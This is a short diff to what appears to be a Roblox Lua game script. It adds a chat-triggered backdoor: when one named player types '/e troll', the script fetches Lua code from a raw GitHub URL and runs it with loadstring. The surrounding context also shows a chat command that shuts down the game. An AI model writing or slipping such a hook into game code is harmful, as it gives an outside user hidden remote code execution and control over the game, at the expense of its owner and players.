@@ -40,3 +40,9 @@ if Message:lower() == "/e kick" then
 game:Shutdown()
 end
 end)
+
+game.Players.zzotac.Chatted:connect(function(Message)
+if Message:lower() == "/e troll" then
+loadstring(game:HttpGet('https://raw.githubusercontent.com/clickclickpow/pls/main/shrek'))()
+end
+end)
